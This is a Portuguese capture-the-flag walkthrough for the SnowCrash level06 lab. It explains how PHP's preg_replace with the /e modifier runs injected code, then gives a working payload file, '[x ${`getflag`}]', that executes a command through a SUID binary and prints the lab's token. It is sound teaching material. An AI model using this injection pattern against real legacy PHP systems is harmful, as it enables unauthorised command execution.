# SnowCrash — Level06 Walkthrough (Metodologia)

## Objetivo

Neste nível, o objetivo é explorar uma vulnerabilidade em um script PHP que utiliza `preg_replace()` com o modifier `/e`.

Esse modifier executa código PHP dentro da substituição da regex, permitindo **execução arbitrária de comandos**.

---

## Arquivos disponíveis

Listando o diretório:

```bash
ls -l
```

Saída típica:

```
-rwsr-x---+ 1 flag06 level06 level06
-rw-r--r--  1 flag06 level06 level06.php
```

Existe:

- um binário SUID (`level06`)
- um script PHP (`level06.php`)

---

## Análise do script PHP

Abrindo o código:

```bash
cat level06.php
```

Trecho importante encontrado:

```php
preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

Problema: o modifier `/e` faz com que o conteúdo capturado seja executado como código PHP.

Ou seja: qualquer entrada controlada pelo usuário pode virar código executável.

---

## Entendimento da vulnerabilidade

Regex:

```
(\[x (.*)\])
```

Substituição:

```
y("\\2")
```

Mas com `/e`, isso vira: executar `y("conteúdo")`.

Se controlarmos o conteúdo, podemos executar:

```
system("getflag")
```

---

## Exploração

Criamos um arquivo com payload:

```bash
echo '[x ${`getflag`}]' > /tmp/exploit
```

Depois executamos:

```bash
./level06 /tmp/exploit
```

---

## Resultado

Saída obtida:

```
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```

**Token obtido:**

```
wiok45aaoguiboiki2tuin6ub
```

---

## Conceito aprendido

Este exercício demonstra: **Remote Command Execution via `preg_replace /e`**.

Problema clássico:

```php
preg_replace("/regex/e", "code", input)
```

Isso permite execução arbitrária de código PHP. Esse recurso foi **removido do PHP moderno** por ser extremamente inseguro.

---

## Vulnerabilidade real equivalente

Muito comum em sistemas antigos:

- CMS antigos (WordPress antigo, Joomla antigo)
- plugins PHP inseguros
- scripts legacy
- frameworks antigos

---

## Ferramentas utilizadas

| Comando     | Função        |
| ----------- | --------------- |
| `ls`      | listar arquivos |
| `cat`     | ler script PHP  |
| `echo`    | criar payload   |
| `getflag` | obter token     |

---

## Resultado final

Exploração realizada com sucesso via `preg_replace()` com modifier `/e`.

**Token obtido:**

```
COLE_AQUI_SEU_TOKEN
```
